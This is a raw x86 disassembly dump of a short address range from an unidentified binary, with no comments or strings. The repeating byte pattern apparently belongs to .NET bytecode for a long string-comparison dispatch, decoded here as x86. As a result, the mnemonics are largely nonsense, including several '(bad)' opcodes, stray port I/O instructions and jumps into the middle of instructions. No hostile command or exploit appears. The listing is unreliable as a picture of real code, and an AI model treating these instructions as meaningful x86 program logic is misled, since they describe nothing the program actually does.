  403c3e:	00 38                	add    %bh,(%eax)
  403c40:	86 34 00             	xchg   %dh,(%eax,%eax,1)
  403c43:	00 08                	add    %cl,(%eax)
  403c45:	20 6b c2             	and    %ch,-0x3e(%ebx)
  403c48:	f1                   	int1
  403c49:	f1                   	int1
  403c4a:	35 1b 08 20 5d       	xor    $0x5d20081b,%eax
  403c4f:	ec                   	in     (%dx),%al
  403c50:	ff f0                	push   %eax
  403c52:	3b 0b                	cmp    (%ebx),%ecx
  403c54:	0a 00                	or     (%eax),%al
  403c56:	00 08                	add    %cl,(%eax)
  403c58:	20 6b c2             	and    %ch,-0x3e(%ebx)
  403c5b:	f1                   	int1
  403c5c:	f1                   	int1
  403c5d:	3b cd                	cmp    %ebp,%ecx
  403c5f:	06                   	push   %es
  403c60:	00 00                	add    %al,(%eax)
  403c62:	38 63 34             	cmp    %ah,0x34(%ebx)
  403c65:	00 00                	add    %al,(%eax)
  403c67:	08 20                	or     %ah,(%eax)
  403c69:	0a f4                	or     %ah,%dh
  403c6b:	c5 f2 3b             	(bad)
  403c6e:	a0 08 00 00 08       	mov    0x8000008,%al
  403c73:	20 4c f6 96          	and    %cl,-0x6a(%esi,%esi,8)
  403c77:	fb                   	sti
  403c78:	3b c3                	cmp    %ebx,%eax
  403c7a:	07                   	pop    %es
  403c7b:	00 00                	add    %al,(%eax)
  403c7d:	08 20                	or     %ah,(%eax)
  403c7f:	f7 4c da fd 2e 6e 38 	testl  $0x40386e2e,-0x3(%edx,%ebx,8)
  403c86:	40 
  403c87:	34 00                	xor    $0x0,%al
  403c89:	00 07                	add    %al,(%edi)
  403c8b:	72 de                	jb     0x403c6b
  403c8d:	08 00                	or     %al,(%eax)
  403c8f:	70 28                	jo     0x403cb9
  403c91:	8c 00                	mov    %es,(%eax)
  403c93:	00 0a                	add    %cl,(%edx)
  403c95:	3a d5                	cmp    %ch,%dl
  403c97:	0b 00                	or     (%eax),%eax
  403c99:	00 38                	add    %bh,(%eax)
  403c9b:	2b 34 00             	sub    (%eax,%eax,1),%esi
  403c9e:	00 07                	add    %al,(%edi)
  403ca0:	72 ea                	jb     0x403c8c
  403ca2:	08 00                	or     %al,(%eax)
  403ca4:	70 28                	jo     0x403cce
  403ca6:	8c 00                	mov    %es,(%eax)
  403ca8:	00 0a                	add    %cl,(%edx)
  403caa:	3a 7e 0c             	cmp    0xc(%esi),%bh
  403cad:	00 00                	add    %al,(%eax)
  403caf:	38 16                	cmp    %dl,(%esi)
  403cb1:	34 00                	xor    $0x0,%al
  403cb3:	00 07                	add    %al,(%edi)
  403cb5:	72 f8                	jb     0x403caf
  403cb7:	08 00                	or     %al,(%eax)
  403cb9:	70 28                	jo     0x403ce3
  403cbb:	8c 00                	mov    %es,(%eax)
  403cbd:	00 0a                	add    %cl,(%edx)
  403cbf:	3a 62 0d             	cmp    0xd(%edx),%ah
  403cc2:	00 00                	add    %al,(%eax)
  403cc4:	38 01                	cmp    %al,(%ecx)
  403cc6:	34 00                	xor    $0x0,%al
  403cc8:	00 07                	add    %al,(%edi)
  403cca:	72 0e                	jb     0x403cda
  403ccc:	09 00                	or     %eax,(%eax)
  403cce:	70 28                	jo     0x403cf8
  403cd0:	8c 00                	mov    %es,(%eax)
  403cd2:	00 0a                	add    %cl,(%edx)
  403cd4:	3a 47 0e             	cmp    0xe(%edi),%al
  403cd7:	00 00                	add    %al,(%eax)
  403cd9:	38 ec                	cmp    %ch,%ah
  403cdb:	33 00                	xor    (%eax),%eax
  403cdd:	00 07                	add    %al,(%edi)
  403cdf:	72 ac                	jb     0x403c8d
  403ce1:	08 00                	or     %al,(%eax)
  403ce3:	70 28                	jo     0x403d0d
  403ce5:	8c 00                	mov    %es,(%eax)
  403ce7:	00 0a                	add    %cl,(%edx)
  403ce9:	3a ea                	cmp    %dl,%ch
  403ceb:	0e                   	push   %cs
  403cec:	00 00                	add    %al,(%eax)
  403cee:	38 d7                	cmp    %dl,%bh
  403cf0:	33 00                	xor    (%eax),%eax
  403cf2:	00 07                	add    %al,(%edi)
  403cf4:	72 22                	jb     0x403d18
  403cf6:	09 00                	or     %eax,(%eax)
  403cf8:	70 28                	jo     0x403d22
  403cfa:	8c 00                	mov    %es,(%eax)
  403cfc:	00 0a                	add    %cl,(%edx)
  403cfe:	3a 86 0f 00 00 38    	cmp    0x3800000f(%esi),%al
  403d04:	c2 33 00             	ret    $0x33
  403d07:	00 07                	add    %al,(%edi)
  403d09:	72 32                	jb     0x403d3d
  403d0b:	09 00                	or     %eax,(%eax)
  403d0d:	70 28                	jo     0x403d37
  403d0f:	8c 00                	mov    %es,(%eax)
  403d11:	00 0a                	add    %cl,(%edx)
  403d13:	3a 22                	cmp    (%edx),%ah
  403d15:	10 00                	adc    %al,(%eax)
  403d17:	00 38                	add    %bh,(%eax)
  403d19:	ad                   	lods   %ds:(%esi),%eax
  403d1a:	33 00                	xor    (%eax),%eax
  403d1c:	00 07                	add    %al,(%edi)
  403d1e:	72 3e                	jb     0x403d5e
  403d20:	09 00                	or     %eax,(%eax)
  403d22:	70 28                	jo     0x403d4c
  403d24:	8c 00                	mov    %es,(%eax)
  403d26:	00 0a                	add    %cl,(%edx)
  403d28:	3a ce                	cmp    %dh,%cl
  403d2a:	10 00                	adc    %al,(%eax)
  403d2c:	00 38                	add    %bh,(%eax)
  403d2e:	98                   	cwtl
  403d2f:	33 00                	xor    (%eax),%eax
  403d31:	00 07                	add    %al,(%edi)
  403d33:	72 54                	jb     0x403d89
  403d35:	09 00                	or     %eax,(%eax)
  403d37:	70 28                	jo     0x403d61
  403d39:	8c 00                	mov    %es,(%eax)
  403d3b:	00 0a                	add    %cl,(%edx)
  403d3d:	3a c5                	cmp    %ch,%al
  403d3f:	10 00                	adc    %al,(%eax)
  403d41:	00 38                	add    %bh,(%eax)
  403d43:	83 33 00             	xorl   $0x0,(%ebx)
  403d46:	00 07                	add    %al,(%edi)
  403d48:	72 68                	jb     0x403db2
  403d4a:	09 00                	or     %eax,(%eax)
  403d4c:	70 28                	jo     0x403d76
  403d4e:	8c 00                	mov    %es,(%eax)
  403d50:	00 0a                	add    %cl,(%edx)
  403d52:	3a bc 10 00 00 38 6e 	cmp    0x6e380000(%eax,%edx,1),%bh
  403d59:	33 00                	xor    (%eax),%eax
  403d5b:	00 07                	add    %al,(%edi)
  403d5d:	72 84                	jb     0x403ce3
  403d5f:	09 00                	or     %eax,(%eax)
  403d61:	70 28                	jo     0x403d8b
  403d63:	8c 00                	mov    %es,(%eax)
  403d65:	00 0a                	add    %cl,(%edx)
  403d67:	3a 68 11             	cmp    0x11(%eax),%ch
  403d6a:	00 00                	add    %al,(%eax)
  403d6c:	38 59 33             	cmp    %bl,0x33(%ecx)
  403d6f:	00 00                	add    %al,(%eax)
  403d71:	07                   	pop    %es
  403d72:	72 92                	jb     0x403d06
  403d74:	09 00                	or     %eax,(%eax)
  403d76:	70 28                	jo     0x403da0
  403d78:	8c 00                	mov    %es,(%eax)
  403d7a:	00 0a                	add    %cl,(%edx)
  403d7c:	3a 2d 12 00 00 38    	cmp    0x38000012,%ch
  403d82:	44                   	inc    %esp
  403d83:	33 00                	xor    (%eax),%eax
  403d85:	00 07                	add    %al,(%edi)
  403d87:	72 a8                	jb     0x403d31
  403d89:	09 00                	or     %eax,(%eax)
  403d8b:	70 28                	jo     0x403db5
  403d8d:	8c 00                	mov    %es,(%eax)
  403d8f:	00 0a                	add    %cl,(%edx)
  403d91:	3a 24 12             	cmp    (%edx,%edx,1),%ah
  403d94:	00 00                	add    %al,(%eax)
  403d96:	38 2f                	cmp    %ch,(%edi)
  403d98:	33 00                	xor    (%eax),%eax
  403d9a:	00 07                	add    %al,(%edi)
  403d9c:	72 be                	jb     0x403d5c
  403d9e:	09 00                	or     %eax,(%eax)
  403da0:	70 28                	jo     0x403dca
  403da2:	8c 00                	mov    %es,(%eax)
  403da4:	00 0a                	add    %cl,(%edx)
  403da6:	3a 1b                	cmp    (%ebx),%bl
  403da8:	12 00                	adc    (%eax),%al
  403daa:	00 38                	add    %bh,(%eax)
  403dac:	1a 33                	sbb    (%ebx),%dh
  403dae:	00 00                	add    %al,(%eax)
  403db0:	07                   	pop    %es
  403db1:	72 d4                	jb     0x403d87
  403db3:	09 00                	or     %eax,(%eax)
  403db5:	70 28                	jo     0x403ddf
  403db7:	8c 00                	mov    %es,(%eax)
  403db9:	00 0a                	add    %cl,(%edx)
  403dbb:	3a 65 12             	cmp    0x12(%ebp),%ah
  403dbe:	00 00                	add    %al,(%eax)
  403dc0:	38 05 33 00 00 07    	cmp    %al,0x7000033
  403dc6:	72 e4                	jb     0x403dac
  403dc8:	09 00                	or     %eax,(%eax)
  403dca:	70 28                	jo     0x403df4
  403dcc:	8c 00                	mov    %es,(%eax)
  403dce:	00 0a                	add    %cl,(%edx)
  403dd0:	3a 47 13             	cmp    0x13(%edi),%al
  403dd3:	00 00                	add    %al,(%eax)
  403dd5:	38 f0                	cmp    %dh,%al
  403dd7:	32 00                	xor    (%eax),%al
  403dd9:	00 07                	add    %al,(%edi)
  403ddb:	72 f8                	jb     0x403dd5
  403ddd:	09 00                	or     %eax,(%eax)
  403ddf:	70 28                	jo     0x403e09
  403de1:	8c 00                	mov    %es,(%eax)
  403de3:	00 0a                	add    %cl,(%edx)
  403de5:	3a f7                	cmp    %bh,%dh
  403de7:	13 00                	adc    (%eax),%eax
  403de9:	00 38                	add    %bh,(%eax)
  403deb:	db 32                	(bad) (%edx)
  403ded:	00 00                	add    %al,(%eax)
  403def:	07                   	pop    %es
  403df0:	72 10                	jb     0x403e02
  403df2:	0a 00                	or     (%eax),%al
  403df4:	70 28                	jo     0x403e1e
  403df6:	8c 00                	mov    %es,(%eax)
  403df8:	00 0a                	add    %cl,(%edx)
  403dfa:	3a a7 14 00 00 38    	cmp    0x38000014(%edi),%ah
  403e00:	c6                   	(bad)
  403e01:	32 00                	xor    (%eax),%al
  403e03:	00 07                	add    %al,(%edi)
  403e05:	72 20                	jb     0x403e27
  403e07:	0a 00                	or     (%eax),%al
  403e09:	70 28                	jo     0x403e33
  403e0b:	8c 00                	mov    %es,(%eax)
  403e0d:	00 0a                	add    %cl,(%edx)
  403e0f:	3a 9e 14 00 00 38    	cmp    0x38000014(%esi),%bl
  403e15:	b1 32                	mov    $0x32,%cl
  403e17:	00 00                	add    %al,(%eax)
  403e19:	07                   	pop    %es
  403e1a:	72 2e                	jb     0x403e4a
  403e1c:	0a 00                	or     (%eax),%al
  403e1e:	70 28                	jo     0x403e48
  403e20:	8c 00                	mov    %es,(%eax)
  403e22:	00 0a                	add    %cl,(%edx)
  403e24:	3a 95 14 00 00 38    	cmp    0x38000014(%ebp),%dl
  403e2a:	9c                   	pushf
  403e2b:	32 00                	xor    (%eax),%al
  403e2d:	00 07                	add    %al,(%edi)
  403e2f:	72 38                	jb     0x403e69
  403e31:	0a 00                	or     (%eax),%al
  403e33:	70 28                	jo     0x403e5d
  403e35:	8c 00                	mov    %es,(%eax)
  403e37:	00 0a                	add    %cl,(%edx)
  403e39:	3a 8c 14 00 00 38 87 	cmp    -0x78c80000(%esp,%edx,1),%cl
  403e40:	32 00                	xor    (%eax),%al
  403e42:	00 07                	add    %al,(%edi)
  403e44:	72 42                	jb     0x403e88
  403e46:	0a 00                	or     (%eax),%al
  403e48:	70 28                	jo     0x403e72
  403e4a:	8c 00                	mov    %es,(%eax)
  403e4c:	00 0a                	add    %cl,(%edx)
  403e4e:	3a 83 14 00 00 38    	cmp    0x38000014(%ebx),%al
  403e54:	72 32                	jb     0x403e88
  403e56:	00 00                	add    %al,(%eax)
  403e58:	07                   	pop    %es
  403e59:	72 56                	jb     0x403eb1
  403e5b:	0a 00                	or     (%eax),%al
  403e5d:	70 28                	jo     0x403e87
  403e5f:	8c 00                	mov    %es,(%eax)
  403e61:	00 0a                	add    %cl,(%edx)
  403e63:	3a 7a 14             	cmp    0x14(%edx),%bh
  403e66:	00 00                	add    %al,(%eax)
  403e68:	38 5d 32             	cmp    %bl,0x32(%ebp)
  403e6b:	00 00                	add    %al,(%eax)
  403e6d:	07                   	pop    %es
  403e6e:	72 6e                	jb     0x403ede
  403e70:	0a 00                	or     (%eax),%al
  403e72:	70 28                	jo     0x403e9c
  403e74:	8c 00                	mov    %es,(%eax)
  403e76:	00 0a                	add    %cl,(%edx)
  403e78:	3a 71 14             	cmp    0x14(%ecx),%dh
  403e7b:	00 00                	add    %al,(%eax)
  403e7d:	38 48 32             	cmp    %cl,0x32(%eax)
  403e80:	00 00                	add    %al,(%eax)
  403e82:	07                   	pop    %es
  403e83:	72 84                	jb     0x403e09
  403e85:	0a 00                	or     (%eax),%al
  403e87:	70 28                	jo     0x403eb1
  403e89:	8c 00                	mov    %es,(%eax)
  403e8b:	00 0a                	add    %cl,(%edx)
  403e8d:	3a 68 14             	cmp    0x14(%eax),%ch
  403e90:	00 00                	add    %al,(%eax)
  403e92:	38 33                	cmp    %dh,(%ebx)
  403e94:	32 00                	xor    (%eax),%al
  403e96:	00 07                	add    %al,(%edi)
  403e98:	72 a2                	jb     0x403e3c
  403e9a:	0a 00                	or     (%eax),%al
  403e9c:	70 28                	jo     0x403ec6
  403e9e:	8c 00                	mov    %es,(%eax)
  403ea0:	00 0a                	add    %cl,(%edx)
  403ea2:	3a 5f 14             	cmp    0x14(%edi),%bl
  403ea5:	00 00                	add    %al,(%eax)
  403ea7:	38 1e                	cmp    %bl,(%esi)
  403ea9:	32 00                	xor    (%eax),%al
  403eab:	00 07                	add    %al,(%edi)
  403ead:	72 ba                	jb     0x403e69
  403eaf:	0a 00                	or     (%eax),%al
  403eb1:	70 28                	jo     0x403edb
  403eb3:	8c 00                	mov    %es,(%eax)
  403eb5:	00 0a                	add    %cl,(%edx)
  403eb7:	3a 56 14             	cmp    0x14(%esi),%dl
  403eba:	00 00                	add    %al,(%eax)
  403ebc:	38 09                	cmp    %cl,(%ecx)
  403ebe:	32 00                	xor    (%eax),%al
  403ec0:	00 07                	add    %al,(%edi)
  403ec2:	72 d2                	jb     0x403e96
  403ec4:	0a 00                	or     (%eax),%al
  403ec6:	70 28                	jo     0x403ef0
  403ec8:	8c 00                	mov    %es,(%eax)
  403eca:	00 0a                	add    %cl,(%edx)
  403ecc:	3a 4d 14             	cmp    0x14(%ebp),%cl
  403ecf:	00 00                	add    %al,(%eax)
  403ed1:	38 f4                	cmp    %dh,%ah
  403ed3:	31 00                	xor    %eax,(%eax)
  403ed5:	00 07                	add    %al,(%edi)
  403ed7:	72 dc                	jb     0x403eb5
  403ed9:	0a 00                	or     (%eax),%al
  403edb:	70 28                	jo     0x403f05
  403edd:	8c 00                	mov    %es,(%eax)
  403edf:	00 0a                	add    %cl,(%edx)
  403ee1:	3a 44 14 00          	cmp    0x0(%esp,%edx,1),%al
  403ee5:	00 38                	add    %bh,(%eax)
  403ee7:	df 31                	fbstp  (%ecx)
  403ee9:	00 00                	add    %al,(%eax)
  403eeb:	07                   	pop    %es
  403eec:	72 ee                	jb     0x403edc
  403eee:	0a 00                	or     (%eax),%al
  403ef0:	70 28                	jo     0x403f1a
  403ef2:	8c 00                	mov    %es,(%eax)
  403ef4:	00 0a                	add    %cl,(%edx)
  403ef6:	3a 3b                	cmp    (%ebx),%bh
  403ef8:	14 00                	adc    $0x0,%al
  403efa:	00 38                	add    %bh,(%eax)
  403efc:	ca 31 00             	lret   $0x31
  403eff:	00 07                	add    %al,(%edi)
  403f01:	72 fe                	jb     0x403f01
  403f03:	0a 00                	or     (%eax),%al
  403f05:	70 28                	jo     0x403f2f
  403f07:	8c 00                	mov    %es,(%eax)
  403f09:	00 0a                	add    %cl,(%edx)
  403f0b:	3a 32                	cmp    (%edx),%dh
  403f0d:	14 00                	adc    $0x0,%al
  403f0f:	00 38                	add    %bh,(%eax)
  403f11:	b5 31                	mov    $0x31,%ch
  403f13:	00 00                	add    %al,(%eax)
  403f15:	07                   	pop    %es
  403f16:	72 10                	jb     0x403f28
  403f18:	0b 00                	or     (%eax),%eax
  403f1a:	70 28                	jo     0x403f44
  403f1c:	8c 00                	mov    %es,(%eax)
  403f1e:	00 0a                	add    %cl,(%edx)
  403f20:	3a 29                	cmp    (%ecx),%ch
  403f22:	14 00                	adc    $0x0,%al
  403f24:	00 38                	add    %bh,(%eax)
  403f26:	a0 31 00 00 07       	mov    0x7000031,%al
  403f2b:	72 20                	jb     0x403f4d
  403f2d:	0b 00                	or     (%eax),%eax
  403f2f:	70 28                	jo     0x403f59
  403f31:	8c 00                	mov    %es,(%eax)
  403f33:	00 0a                	add    %cl,(%edx)
  403f35:	3a d9                	cmp    %cl,%bl
  403f37:	14 00                	adc    $0x0,%al
  403f39:	00 38                	add    %bh,(%eax)
  403f3b:	8b 31                	mov    (%ecx),%esi
  403f3d:	00 00                	add    %al,(%eax)
  403f3f:	07                   	pop    %es
  403f40:	72 30                	jb     0x403f72
  403f42:	0b 00                	or     (%eax),%eax
  403f44:	70 28                	jo     0x403f6e
  403f46:	8c 00                	mov    %es,(%eax)
  403f48:	00 0a                	add    %cl,(%edx)
  403f4a:	3a d0                	cmp    %al,%dl
  403f4c:	14 00                	adc    $0x0,%al
  403f4e:	00 38                	add    %bh,(%eax)
  403f50:	76 31                	jbe    0x403f83
  403f52:	00 00                	add    %al,(%eax)
  403f54:	07                   	pop    %es
  403f55:	72 44                	jb     0x403f9b
  403f57:	0b 00                	or     (%eax),%eax
  403f59:	70 28                	jo     0x403f83
  403f5b:	8c 00                	mov    %es,(%eax)
  403f5d:	00 0a                	add    %cl,(%edx)
  403f5f:	3a c7                	cmp    %bh,%al
  403f61:	14 00                	adc    $0x0,%al
  403f63:	00 38                	add    %bh,(%eax)
  403f65:	61                   	popa
  403f66:	31 00                	xor    %eax,(%eax)
  403f68:	00 07                	add    %al,(%edi)
  403f6a:	72 5c                	jb     0x403fc8
  403f6c:	0b 00                	or     (%eax),%eax
  403f6e:	70 28                	jo     0x403f98
  403f70:	8c 00                	mov    %es,(%eax)
  403f72:	00 0a                	add    %cl,(%edx)
  403f74:	3a be 14 00 00 38    	cmp    0x38000014(%esi),%bh
  403f7a:	4c                   	dec    %esp
  403f7b:	31 00                	xor    %eax,(%eax)
  403f7d:	00 07                	add    %al,(%edi)
  403f7f:	72 76                	jb     0x403ff7
  403f81:	0b 00                	or     (%eax),%eax
  403f83:	70 28                	jo     0x403fad
  403f85:	8c 00                	mov    %es,(%eax)
  403f87:	00 0a                	add    %cl,(%edx)
  403f89:	3a b5 14 00 00 38    	cmp    0x38000014(%ebp),%dh
  403f8f:	37                   	aaa
  403f90:	31 00                	xor    %eax,(%eax)
  403f92:	00 07                	add    %al,(%edi)
  403f94:	72 86                	jb     0x403f1c
  403f96:	0b 00                	or     (%eax),%eax
  403f98:	70 28                	jo     0x403fc2
  403f9a:	8c 00                	mov    %es,(%eax)
  403f9c:	00 0a                	add    %cl,(%edx)
  403f9e:	3a ff                	cmp    %bh,%bh
  403fa0:	14 00                	adc    $0x0,%al
  403fa2:	00 38                	add    %bh,(%eax)
  403fa4:	22 31                	and    (%ecx),%dh
  403fa6:	00 00                	add    %al,(%eax)
  403fa8:	07                   	pop    %es
  403fa9:	72 96                	jb     0x403f41
  403fab:	0b 00                	or     (%eax),%eax
  403fad:	70 28                	jo     0x403fd7
  403faf:	8c 00                	mov    %es,(%eax)
  403fb1:	00 0a                	add    %cl,(%edx)
  403fb3:	3a d6                	cmp    %dh,%dl
  403fb5:	15 00 00 38 0d       	adc    $0xd380000,%eax
  403fba:	31 00                	xor    %eax,(%eax)
  403fbc:	00 07                	add    %al,(%edi)
  403fbe:	72 a8                	jb     0x403f68
  403fc0:	0b 00                	or     (%eax),%eax
  403fc2:	70 28                	jo     0x403fec
  403fc4:	8c 00                	mov    %es,(%eax)
  403fc6:	00 0a                	add    %cl,(%edx)
  403fc8:	3a 9a 16 00 00 38    	cmp    0x38000016(%edx),%bl
  403fce:	f8                   	clc
  403fcf:	30 00                	xor    %al,(%eax)
  403fd1:	00 07                	add    %al,(%edi)
  403fd3:	72 b2                	jb     0x403f87
  403fd5:	0b 00                	or     (%eax),%eax
  403fd7:	70 28                	jo     0x404001
  403fd9:	8c 00                	mov    %es,(%eax)
  403fdb:	00 0a                	add    %cl,(%edx)
  403fdd:	3a 91 16 00 00 38    	cmp    0x38000016(%ecx),%dl
  403fe3:	e3 30                	jecxz  0x404015
  403fe5:	00 00                	add    %al,(%eax)
  403fe7:	07                   	pop    %es
  403fe8:	72 c0                	jb     0x403faa
  403fea:	0b 00                	or     (%eax),%eax
  403fec:	70 28                	jo     0x404016
  403fee:	8c 00                	mov    %es,(%eax)
  403ff0:	00 0a                	add    %cl,(%edx)
  403ff2:	3a db                	cmp    %bl,%bl
  403ff4:	16                   	push   %ss
  403ff5:	00 00                	add    %al,(%eax)
  403ff7:	38 ce                	cmp    %cl,%dh
  403ff9:	30 00                	xor    %al,(%eax)
  403ffb:	00 07                	add    %al,(%edi)
  403ffd:	72 d2                	jb     0x403fd1
  403fff:	0b 00                	or     (%eax),%eax
  404001:	70 28                	jo     0x40402b
  404003:	8c 00                	mov    %es,(%eax)
  404005:	00 0a                	add    %cl,(%edx)
  404007:	3a 25 17 00 00 38    	cmp    0x38000017,%ah
  40400d:	b9 30 00 00 07       	mov    $0x7000030,%ecx
  404012:	72 e6                	jb     0x403ffa
  404014:	0b 00                	or     (%eax),%eax
  404016:	70 28                	jo     0x404040
  404018:	8c 00                	mov    %es,(%eax)
  40401a:	00 0a                	add    %cl,(%edx)
  40401c:	3a da                	cmp    %dl,%bl
  40401e:	17                   	pop    %ss
  40401f:	00 00                	add    %al,(%eax)
  404021:	38 a4 30 00 00 07 72 	cmp    %ah,0x72070000(%eax,%esi,1)
  404028:	f8                   	clc
  404029:	0b 00                	or     (%eax),%eax
  40402b:	70 28                	jo     0x404055
  40402d:	8c 00                	mov    %es,(%eax)
  40402f:	00 0a                	add    %cl,(%edx)
  404031:	3a d1                	cmp    %cl,%dl
  404033:	17                   	pop    %ss
  404034:	00 00                	add    %al,(%eax)
  404036:	38 8f 30 00 00 07    	cmp    %cl,0x7000030(%edi)
  40403c:	72 02                	jb     0x404040
  40403e:	0c 00                	or     $0x0,%al
  404040:	70 28                	jo     0x40406a
  404042:	8c 00                	mov    %es,(%eax)
  404044:	00 0a                	add    %cl,(%edx)
  404046:	3a 95 18 00 00 38    	cmp    0x38000018(%ebp),%dl
  40404c:	7a 30                	jp     0x40407e
  40404e:	00 00                	add    %al,(%eax)
  404050:	07                   	pop    %es
  404051:	72 14                	jb     0x404067
  404053:	0c 00                	or     $0x0,%al
  404055:	70 28                	jo     0x40407f
  404057:	8c 00                	mov    %es,(%eax)
  404059:	00 0a                	add    %cl,(%edx)
  40405b:	3a 8c 18 00 00 38 65 	cmp    0x65380000(%eax,%ebx,1),%cl
  404062:	30 00                	xor    %al,(%eax)
  404064:	00 07                	add    %al,(%edi)
  404066:	72 22                	jb     0x40408a
  404068:	0c 00                	or     $0x0,%al
  40406a:	70 28                	jo     0x404094
  40406c:	8c 00                	mov    %es,(%eax)
  40406e:	00 0a                	add    %cl,(%edx)
  404070:	3a 99 19 00 00 38    	cmp    0x38000019(%ecx),%bl
  404076:	50                   	push   %eax
  404077:	30 00                	xor    %al,(%eax)
  404079:	00 07                	add    %al,(%edi)
  40407b:	72 2c                	jb     0x4040a9
  40407d:	0c 00                	or     $0x0,%al
  40407f:	70 28                	jo     0x4040a9
  404081:	8c 00                	mov    %es,(%eax)
  404083:	00 0a                	add    %cl,(%edx)
  404085:	3a 62 1a             	cmp    0x1a(%edx),%ah
  404088:	00 00                	add    %al,(%eax)
  40408a:	38 3b                	cmp    %bh,(%ebx)
  40408c:	30 00                	xor    %al,(%eax)
  40408e:	00 07                	add    %al,(%edi)
  404090:	72 3a                	jb     0x4040cc
  404092:	0c 00                	or     $0x0,%al
  404094:	70 28                	jo     0x4040be
  404096:	8c 00                	mov    %es,(%eax)
  404098:	00 0a                	add    %cl,(%edx)
  40409a:	3a 59 1a             	cmp    0x1a(%ecx),%bl
  40409d:	00 00                	add    %al,(%eax)
  40409f:	38 26                	cmp    %ah,(%esi)
  4040a1:	30 00                	xor    %al,(%eax)
  4040a3:	00 07                	add    %al,(%edi)
  4040a5:	72 44                	jb     0x4040eb
  4040a7:	0c 00                	or     $0x0,%al
  4040a9:	70 28                	jo     0x4040d3
  4040ab:	8c 00                	mov    %es,(%eax)
  4040ad:	00 0a                	add    %cl,(%edx)
  4040af:	3a 50 1a             	cmp    0x1a(%eax),%dl
  4040b2:	00 00                	add    %al,(%eax)
  4040b4:	38 11                	cmp    %dl,(%ecx)
  4040b6:	30 00                	xor    %al,(%eax)
  4040b8:	00 07                	add    %al,(%edi)
  4040ba:	72 58                	jb     0x404114
  4040bc:	0c 00                	or     $0x0,%al
  4040be:	70 28                	jo     0x4040e8
  4040c0:	8c 00                	mov    %es,(%eax)
  4040c2:	00 0a                	add    %cl,(%edx)
  4040c4:	3a 47 1a             	cmp    0x1a(%edi),%al
  4040c7:	00 00                	add    %al,(%eax)
  4040c9:	38 fc                	cmp    %bh,%ah
  4040cb:	2f                   	das
  4040cc:	00 00                	add    %al,(%eax)
  4040ce:	07                   	pop    %es
  4040cf:	72 70                	jb     0x404141
  4040d1:	0c 00                	or     $0x0,%al
  4040d3:	70 28                	jo     0x4040fd
  4040d5:	8c 00                	mov    %es,(%eax)
  4040d7:	00 0a                	add    %cl,(%edx)
  4040d9:	3a 10                	cmp    (%eax),%dl
  4040db:	1b 00                	sbb    (%eax),%eax
  4040dd:	00 38                	add    %bh,(%eax)
  4040df:	e7 2f                	out    %eax,$0x2f
  4040e1:	00 00                	add    %al,(%eax)
  4040e3:	07                   	pop    %es
  4040e4:	72 8a                	jb     0x404070
  4040e6:	0c 00                	or     $0x0,%al
  4040e8:	70 28                	jo     0x404112
  4040ea:	8c 00                	mov    %es,(%eax)
  4040ec:	00 0a                	add    %cl,(%edx)
  4040ee:	3a 07                	cmp    (%edi),%al
  4040f0:	1b 00                	sbb    (%eax),%eax
  4040f2:	00 38                	add    %bh,(%eax)
  4040f4:	d2 2f                	shrb   %cl,(%edi)
  4040f6:	00 00                	add    %al,(%eax)
  4040f8:	07                   	pop    %es
  4040f9:	72 9e                	jb     0x404099
  4040fb:	0c 00                	or     $0x0,%al
  4040fd:	70 28                	jo     0x404127
  4040ff:	8c 00                	mov    %es,(%eax)
  404101:	00 0a                	add    %cl,(%edx)
  404103:	3a b7 1b 00 00 38    	cmp    0x3800001b(%edi),%dh
  404109:	bd 2f 00 00 07       	mov    $0x700002f,%ebp
  40410e:	72 b0                	jb     0x4040c0
  404110:	0c 00                	or     $0x0,%al
  404112:	70 28                	jo     0x40413c
  404114:	8c 00                	mov    %es,(%eax)
  404116:	00 0a                	add    %cl,(%edx)
  404118:	3a 01                	cmp    (%ecx),%al
  40411a:	1c 00                	sbb    $0x0,%al
  40411c:	00 38                	add    %bh,(%eax)
  40411e:	a8 2f                	test   $0x2f,%al
  404120:	00 00                	add    %al,(%eax)
  404122:	07                   	pop    %es
  404123:	72 b8                	jb     0x4040dd
  404125:	0c 00                	or     $0x0,%al
  404127:	70 28                	jo     0x404151
  404129:	8c 00                	mov    %es,(%eax)
  40412b:	00 0a                	add    %cl,(%edx)
  40412d:	3a f8                	cmp    %al,%bh
  40412f:	1b 00                	sbb    (%eax),%eax
  404131:	00 38                	add    %bh,(%eax)
  404133:	93                   	xchg   %eax,%ebx
  404134:	2f                   	das
  404135:	00 00                	add    %al,(%eax)
  404137:	07                   	pop    %es
  404138:	72 c2                	jb     0x4040fc
  40413a:	0c 00                	or     $0x0,%al
  40413c:	70 28                	jo     0x404166
  40413e:	8c 00                	mov    %es,(%eax)
  404140:	00 0a                	add    %cl,(%edx)
  404142:	3a ef                	cmp    %bh,%ch
  404144:	1b 00                	sbb    (%eax),%eax
  404146:	00 38                	add    %bh,(%eax)
  404148:	7e 2f                	jle    0x404179
  40414a:	00 00                	add    %al,(%eax)
  40414c:	07                   	pop    %es
  40414d:	72 d0                	jb     0x40411f
  40414f:	0c 00                	or     $0x0,%al
  404151:	70 28                	jo     0x40417b
  404153:	8c 00                	mov    %es,(%eax)
  404155:	00 0a                	add    %cl,(%edx)
  404157:	3a e6                	cmp    %dh,%ah
  404159:	1b 00                	sbb    (%eax),%eax
  40415b:	00 38                	add    %bh,(%eax)
  40415d:	69 2f 00 00 07 72    	imul   $0x72070000,(%edi),%ebp
  404163:	d6                   	salc
  404164:	0c 00                	or     $0x0,%al
  404166:	70 28                	jo     0x404190
  404168:	8c 00                	mov    %es,(%eax)
  40416a:	00 0a                	add    %cl,(%edx)
  40416c:	3a dd                	cmp    %ch,%bl
  40416e:	1b 00                	sbb    (%eax),%eax
  404170:	00 38                	add    %bh,(%eax)
  404172:	54                   	push   %esp
  404173:	2f                   	das
  404174:	00 00                	add    %al,(%eax)
  404176:	07                   	pop    %es
  404177:	72 de                	jb     0x404157
  404179:	0c 00                	or     $0x0,%al
  40417b:	70 28                	jo     0x4041a5
  40417d:	8c 00                	mov    %es,(%eax)
  40417f:	00 0a                	add    %cl,(%edx)
  404181:	3a d4                	cmp    %ah,%dl
  404183:	1b 00                	sbb    (%eax),%eax
  404185:	00 38                	add    %bh,(%eax)
  404187:	3f                   	aas
  404188:	2f                   	das
  404189:	00 00                	add    %al,(%eax)
  40418b:	07                   	pop    %es
  40418c:	72 f4                	jb     0x404182
  40418e:	0c 00                	or     $0x0,%al
  404190:	70 28                	jo     0x4041ba
  404192:	8c 00                	mov    %es,(%eax)
  404194:	00 0a                	add    %cl,(%edx)
  404196:	3a cb                	cmp    %bl,%cl
  404198:	1b 00                	sbb    (%eax),%eax
